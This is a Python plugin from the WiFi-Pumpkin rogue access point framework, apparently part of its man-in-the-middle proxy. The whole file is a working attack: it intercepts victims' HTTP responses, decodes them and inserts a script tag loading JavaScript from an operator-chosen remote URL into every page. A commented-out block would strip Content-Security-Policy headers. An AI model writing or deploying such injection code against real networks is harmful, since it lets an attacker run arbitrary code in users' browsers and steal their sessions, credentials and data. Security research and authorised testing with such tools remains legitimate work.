from mitmproxy.models import decoded
from plugins.extension.plugin import PluginTemplate,BeautifulSoup

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class js_inject(PluginTemplate):
    meta = {
        'Name'      : 'js_inject',
        'Version'   : '1.0',
        'Description' : 'url injection insert and use our own JavaScript code in a page.',
        'Author'    : 'Marcos Nesster'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.url = self.config.get_setting('set_js_inject','url')

    def request(self, flow):
        pass

    def response(self,flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            """
            # To Allow CORS
            if "Content-Security-Policy" in flow.response.headers:
                del flow.response.headers["Content-Security-Policy"]
            """
            if html.body:
                script = html.new_tag(
                    'script',
                    src=self.url)
                html.body.insert(0, script)
                flow.response.content = str(html)
                self.send_output.emit("[{}]******* script Filter Injected *******".format(self.Name))